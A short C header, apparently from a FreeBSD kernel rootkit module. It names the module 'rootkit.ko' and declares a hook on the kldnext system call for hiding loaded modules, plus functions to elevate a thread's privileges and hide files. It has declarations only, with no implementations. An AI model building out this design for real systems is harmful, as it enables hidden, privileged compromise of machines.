#define LINKER_FILE "rootkit.ko"
#define MODULE_NAME "rootkit"
#define T_NAME "test.txt"

extern struct sx kld_sx;
extern linker_file_list_t linker_files;

int sys_kldnext_hook(struct thread *td, struct kldnext_args *uap);

void elevate(struct thread *td);
void hide(struct thread *td, char * path);
